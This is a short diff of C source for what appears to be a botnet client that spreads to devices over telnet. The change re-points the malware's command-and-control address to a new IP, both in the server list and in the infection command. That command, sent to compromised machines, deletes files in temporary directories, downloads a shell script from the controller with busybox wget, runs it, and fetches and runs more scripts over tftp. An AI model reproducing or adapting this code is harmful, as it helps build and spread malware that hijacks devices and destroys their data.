@@ -53,7 +53,7 @@
 
 unsigned char *commServer[] =
 {
-        "173.214.162.76:666"
+        "67.211.220.210:666"
 };
 
 //    ___                 _
@@ -989,7 +989,7 @@ void StartTheLelz()
 				{
 					if(fds[i].totalTimeout == 0) fds[i].totalTimeout = time(NULL);
                     
-					if(send(fds[i].fd, "cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;rm -f *;busybox wget http://173.214.162.76/gtop.sh;sh gtop.sh;busybox tftp -r tftp1.sh -g ; sh tftp1.sh; busybox tftp -c get tftp2.sh; sh tftp2.sh;;exit\r\n", 275, MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; memset(fds[i].sockbuf, 0, 1024); continue; }
+					if(send(fds[i].fd, "cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;rm -f *;busybox wget http://67.211.220.210/gtop.sh;sh gtop.sh;busybox tftp -r tftp1.sh -g ; sh tftp1.sh; busybox tftp -c get tftp2.sh; sh tftp2.sh;;exit\r\n", 275, MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; memset(fds[i].sockbuf, 0, 1024); continue; }
                     
 					if(fds[i].totalTimeout + 10 < time(NULL))
 					{
